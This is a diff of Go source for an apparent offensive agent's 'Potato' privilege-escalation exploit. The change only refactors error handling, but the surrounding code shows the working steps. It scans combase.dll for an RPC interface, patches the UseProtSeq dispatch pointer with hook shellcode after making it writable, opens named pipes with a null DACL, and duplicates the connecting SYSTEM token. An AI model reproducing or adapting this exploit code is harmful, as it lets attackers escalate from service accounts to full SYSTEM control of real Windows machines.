@@ -56,11 +56,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Phase 0: Check SeImpersonatePrivilege
 	atomic.StoreInt32(phase, 0)
 	if !checkPrivilege("SeImpersonatePrivilege") {
-		return structs.CommandResult{
-			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).")
 	}
 
 	// Pin this goroutine to an OS thread — COM state is per-thread and
@@ -75,60 +71,36 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 
 	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to find combase.dll: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to find combase.dll: %v", err)
 	}
 
 	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to find ORCB RPC interface in combase.dll: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to find ORCB RPC interface in combase.dll: %v", err)
 	}
 
 	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
 	atomic.StoreInt32(phase, 2)
 	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
 	if rpcIface.DispatchTable == 0 {
-		return structs.CommandResult{
-			Output:    "RPC_SERVER_INTERFACE dispatch table pointer is null",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("RPC_SERVER_INTERFACE dispatch table pointer is null")
 	}
 
 	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
 	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
-		return structs.CommandResult{
-			Output:    "RPC dispatch table is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("RPC dispatch table is empty")
 	}
 
 	// UseProtSeq is at index 0 in the MIDL_SERVER_INFO dispatch table
 	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
 	if midlInfo == nil || midlInfo.DispatchTable == 0 {
-		return structs.CommandResult{
-			Output:    "MIDL_SERVER_INFO dispatch table is null",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("MIDL_SERVER_INFO dispatch table is null")
 	}
 
 	// Read parameter count from MIDL format string (varies by Windows version)
 	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
 	if paramErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to read UseProtSeq param count: %v", paramErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to read UseProtSeq param count: %v", paramErr)
 	}
 	potatoGlobal.paramCount = paramCount
 
@@ -143,11 +115,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
 	oxid, oid, ipid, oxidErr := extractProcessOXID()
 	if oxidErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to extract process OXID: %v", oxidErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to extract process OXID: %v", oxidErr)
 	}
 
 	// Phase 4: Create named pipe server with multiple instances.
@@ -169,18 +137,10 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Create the pipe with permissive DACL
 	sd, sdErr := windows.NewSecurityDescriptor()
 	if sdErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("NewSecurityDescriptor: %v", sdErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("NewSecurityDescriptor: %v", sdErr)
 	}
 	if err := sd.SetDACL(nil, true, false); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("SetDACL: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("SetDACL: %v", err)
 	}
 
 	sa := windows.SecurityAttributes{
@@ -217,11 +177,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 				windows.CloseHandle(pipes[j].event)
 				windows.CloseHandle(pipes[j].handle)
 			}
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr)
 		}
 		evt, _ := windows.CreateEvent(nil, 1, 0, nil)
 		pipes[i] = pipeInstance{
@@ -246,31 +202,19 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Allocate DSA on the process heap (RPC runtime will HeapFree it)
 	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
 	if dsaErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to allocate DSA on heap: %v", dsaErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to allocate DSA on heap: %v", dsaErr)
 	}
 
 	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
 	if hookErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to build hook shellcode: %v", hookErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to build hook shellcode: %v", hookErr)
 	}
 
 	// Make the dispatch table writable
 	var oldProtect uint32
 	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("protection change on dispatch table: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("protection change on dispatch table: %v", err)
 	}
 
 	// Replace the function pointer
@@ -413,11 +357,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 			procDisconnectNamedPipe.Call(hPipe)
 
 			if err != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err)
 			}
 
 			gotSystem = true
@@ -455,11 +395,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Store SYSTEM token
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
 		windows.CloseHandle(windows.Handle(dupToken))
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Connected as SYSTEM but SetIdentityToken: %v", setErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Connected as SYSTEM but SetIdentityToken: %v", setErr)
 	}
 
 	newIdentity, _ := GetCurrentIdentity()
